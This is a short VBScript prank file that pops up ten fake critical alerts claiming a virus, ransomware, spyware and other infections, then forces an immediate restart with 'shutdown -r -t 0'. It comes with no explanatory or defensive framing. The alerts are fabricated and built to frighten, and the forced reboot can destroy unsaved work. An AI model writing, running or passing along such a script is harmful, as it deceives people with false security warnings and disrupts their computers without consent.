Dim objShell
Set objShell = CreateObject("WScript.Shell")

' Display multiple error messages
For i = 1 To 10
    Dim errorMessage
    errorMessage = GenerateErrorMessage(i)
    MsgBox errorMessage, vbCritical + vbOKOnly, "Virus Detected!"
Next

' Function to generate different error messages
Function GenerateErrorMessage(index)
    Dim errorMessage
    Select Case index
        Case 1
            errorMessage = "Critical Error: Virus Detected!"
        Case 2
            errorMessage = "Attention: System Compromised!"
        Case 3
            errorMessage = "Warning: Malware Invasion!"
        Case 4
            errorMessage = "Alert: Data Breach Detected!"
        Case 5
            errorMessage = "Danger: Security Breach Detected!"
        Case 6
            errorMessage = "Error: Trojan Horse Found!"
        Case 7
            errorMessage = "Virus Alert: Your PC is Under Attack!"
        Case 8
            errorMessage = "Urgent: Ransomware Detected!"
        Case 9
            errorMessage = "Critical Alert: Spyware Installed!"
        Case 10
            errorMessage = "Emergency: Worm Infection Detected!"
    End Select
    GenerateErrorMessage = errorMessage & vbCrLf & "Your computer is infected. Please take immediate action."
End Function
  

' Restart the computer
objShell.Run "shutdown -r -t 0"


